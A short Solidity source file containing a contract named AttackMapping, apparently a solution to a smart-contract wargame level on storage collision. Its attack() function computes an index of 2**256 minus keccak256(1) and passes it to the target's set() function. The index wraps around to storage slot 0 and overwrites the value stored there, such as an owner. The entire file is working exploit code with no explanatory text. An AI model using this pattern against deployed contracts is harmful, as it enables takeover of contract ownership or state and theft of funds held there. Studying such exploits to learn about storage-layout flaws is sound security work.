// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface Mapping {
    function set(uint256 key, uint256 value) external;

    function get(uint256 key) external returns (uint256);
}

contract AttackMapping {
    address target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public {
        uint256 keccak_1 = uint256(keccak256(abi.encode(1)));
        uint256 i = 2**256 - 1 - keccak_1 + 1;
        Mapping(target).set(i, 1);
    }
}
